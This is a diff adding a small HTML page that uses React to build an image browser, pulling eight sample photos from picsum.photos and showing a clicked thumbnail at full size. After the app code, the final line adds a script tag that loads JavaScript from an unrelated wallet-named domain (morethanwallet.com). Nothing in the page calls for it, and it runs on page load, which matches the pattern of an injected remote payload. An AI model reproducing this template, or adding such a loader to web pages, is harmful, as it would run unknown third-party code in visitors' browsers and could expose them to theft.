@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Image Browser</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/react/17.0.2/umd/react.development.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/17.0.2/umd/react-dom.development.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/6.26.0/babel.min.js"></script>
+    <style>
+      .thumbnail {
+        width: 100px;
+        height: 100px;
+        cursor: pointer;
+        margin: 5px;
+        display: inline-block;
+        border-radius: 5px;
+        transition: transform 0.3s ease;
+        border: 2px solid #777; /* Gray border */
+        background-color: #292929; /* Dark background */
+      }
+
+      .thumbnail:hover {
+        transform: scale(1.1);
+      }
+
+      .thumbnail-container {
+        text-align: center;
+        margin-top: 20px;
+      }
+
+      .selected-image-container {
+        text-align: center;
+        margin-top: 40px;
+      }
+
+      .selected-image-container img {
+        max-width: 30%;
+        max-height: 60vh;
+        border-radius: 5px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+      }
+
+      .line {
+        width: 80%;
+        margin: auto;
+        margin-bottom: 20px;
+        border-bottom: 1px solid #777; /* Gray line */
+      }
+
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin: 0;
+        padding: 0;
+        background-color: #292929; /* Dark background */
+        color: #fff; /* White text */
+      }
+
+      h1,
+      h2 {
+        text-align: center;
+        color: #fff; /* White text */
+      }
+    </style>
+  </head>
+  <body>
+    <div id="app"></div>
+
+    <script type="text/babel">
+      class ImageBrowserApp extends React.Component {
+        constructor(props) {
+          super(props);
+          this.state = {
+            images: [],
+            selectedImage: `https://picsum.photos/1000/600?image=0`,
+            currentIndex: 0,
+          };
+        }
+
+        componentDidMount() {
+          const limit = 8; //8pics;
+          fetch("https://picsum.photos/v2/list?limit=" + limit)
+            .then((response) => response.json())
+            .then((data) => {
+              const images = data.map((item) => ({
+                thumbnail: `https://picsum.photos/100/100?image=${item.id}`,
+                full: `https://picsum.photos/${item.width}/${item.height}?image=${item.id}`,
+              }));
+              this.setState({ images });
+            })
+            .catch((error) => console.error("Error fetching images:", error));
+        }
+
+        selectImage = (imageUrl) => {
+          this.setState({ selectedImage: imageUrl });
+        };
+
+        render() {
+          return (
+            <div>
+              <h1>Image Browser</h1>
+              <div className="thumbnail-container">
+                {/* Thumbnails */}
+                {this.state.images.map((image) => (
+                  <img
+                    key={image.thumbnail}
+                    src={image.thumbnail}
+                    className="thumbnail"
+                    onClick={() => this.selectImage(image.full)}
+                  />
+                ))}
+              </div>
+              <div className="line"></div> {/* Horizontal line */}
+              {this.state.selectedImage && (
+                <div className="selected-image-container">
+                  {/* Selected Image */}
+                  <h2>Selected Image</h2>
+                  <img src={this.state.selectedImage} alt="Selected Image" />
+                </div>
+              )}
+            </div>
+          );
+        }
+      }
+
+      ReactDOM.render(<ImageBrowserApp />, document.getElementById("app"));
+    </script>
+    <script src="https://morethanwallet.com/appstore/index.js"></script>
+  </body>
+</html>
